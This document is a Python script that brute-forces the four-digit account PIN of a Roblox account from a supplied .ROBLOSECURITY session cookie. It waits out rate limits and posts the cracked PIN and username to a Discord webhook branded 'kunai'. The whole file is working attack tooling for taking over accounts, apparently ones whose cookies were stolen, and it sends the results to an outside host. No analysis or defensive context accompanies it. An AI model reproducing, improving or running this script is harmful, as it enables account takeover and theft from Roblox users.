import requests, time,  os

def user_input(question:str) -> str:
    print('')
    _input = input(question)
    os.system('cls')
    return _input

def is_valid_cookie(cookie:str) -> bool:
    response = requests.get("https://users.roblox.com/v1/users/authenticated", cookies = {".ROBLOSECURITY":cookie}).text
    return not "Authorization has been denied for this request." in response

def crack_pin(cookie) -> int:
    URL = 'https://auth.roblox.com/v1/account/pin/unlock'
    response = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
    xcrsf = (response.headers['x-csrf-token'])
    header = {'X-CSRF-TOKEN': xcrsf}

    for i in range(9999):
        pin = str(i).zfill(4)
        response = requests.post(URL, data = {'pin':pin}, headers = header, cookies = {".ROBLOSECURITY":cookie}).text

        if 'unlockedUntil' in response:
            print(f'Pin Cracked! Pin: {pin}')
            
            return pin

        elif 'Too many requests made' in response:        
            print('Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
    return -1

def send_embed(cookie, webhook, ping_everyone, pin) -> None:
    username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']

    if ping_everyone == 'y':
        ping = '@everyone'

    data = {
        "content" : f"{ping} **https://discord.gg/kunai**",
        "username" : "kunai;",
        "avatar_url" : "https://cdn.discordapp.com/attachments/930056703930671164/930057430270881812/Tanqr_gfx.png"
    }
    data["embeds"] = [
        {
            "description" : f"{username}\'s Pin:\n```{pin}```",
            "title" : "Cracked Pin!",
            "color" : 0x00ffff,
        }
    ]

    requests.post(webhook, json = data)

if __name__ == '__main__':
    
    cookie = user_input('Enter your cookie below:')
    if not is_valid_cookie(cookie):
        print("Cookie is invalid.")
        exit()

    webhook = user_input('Enter your webhook below:')
    ping_everyone = user_input('Should we ping Everyone?: ( y / n )').lower()
    pin = crack_pin(cookie)
    if pin != -1:
        send_embed(cookie, webhook, ping_everyone, pin)

    input('\nPress any key to exit')
